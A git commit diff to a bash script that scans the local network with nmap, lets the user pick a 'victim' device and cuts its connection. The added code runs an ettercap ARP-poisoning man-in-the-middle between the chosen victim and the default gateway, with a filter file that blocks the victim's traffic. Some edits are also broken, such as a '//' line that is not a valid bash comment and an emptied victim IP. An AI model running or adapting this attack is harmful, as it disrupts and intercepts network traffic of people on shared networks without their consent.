adbf339187ea21205509c1722326ea54e55d75ca
Pedro Mata Rodrigues <pmmatarodrigues@gmail.com>
2019-06-14 16:44:52 +0100

    add ettercap files to block access

--- remove_from_network.sh
+++ remove_from_network.sh
@@ -8,22 +8,27 @@ function getIPAddress {
   userIPAddress=$(hostname -I | xargs);
 }
 
+function getDefaultGateway {
+  defaultGateway=$(ip r | grep default | awk '{print $3}')
+}
 
 function getIPAddressesInNetwork {
   printf "\n\nDetecting devices in the network... \n"
   ipAddresses=( $(nmap -n -sn $userIPAddress/24 -oG - | awk '/Up$/{print $2}' | xargs) )
-  getMACAddressesInNetwork
+  //getMACAddressesInNetwork
 }
 
 function getMACAddressesInNetwork {
   printf "Resolving MAC Addresses... \n"
-  i=0
-  macAddresses=()
-  for ip in "${ipAddresses[@]}"
-  do
-    macAddresses+=( $(arping -I $defaultInterface -c1 $ip | grep from | awk '{print $4}') )
-    ((i++))
-  done
+  #i=0
+  #macAddresses=()
+  #for ip in "${ipAddresses[@]}"
+  #do
+  #macAddresses+=( $(arping -I $defaultInterface -c1 $ip | grep from | awk '{print $4}') )
+  #  ((i++))
+  #done
+  victimIPAddress=""
+  victimMACAddress=$(arping -I $defaultInterface -c1 $victimIPAddress | grep from | awk '{print $4}')
 }
 
 function printIPAddressesInNetwork {
@@ -58,6 +63,7 @@ function removeDeviceFromNetwork {
   printf "\n SELECT IP TO BLOCK > \n"
   read -r ipSelectedOption
 
+  getMACAddressesInNetwork
   blockAfterSelectIP
 
   askForAnyKeyReturn
@@ -66,7 +72,10 @@ function removeDeviceFromNetwork {
 
 function blockAfterSelectIP {
   victimIPAddress=${ipAddresses[ipSelectedOption-1]}
-  victimMACAddress=${macAddresses[ipSelectedOption-1]}
+  #victimMACAddress=${macAddresses[ipSelectedOption-1]}
   echo -e " ${YELLOW}Victim IP: ${RED}"$victimIPAddress${WHITE}
   echo -e " ${YELLOW}Victim MAC: ${RED}"$victimMACAddress${WHITE}
+
+  printf "Blocking network access from "$victimIPAddress
+  ettercap -T -q -p -F block.ef -M arp:remote /$victimIPAddress// /$defaultGateway//
 }
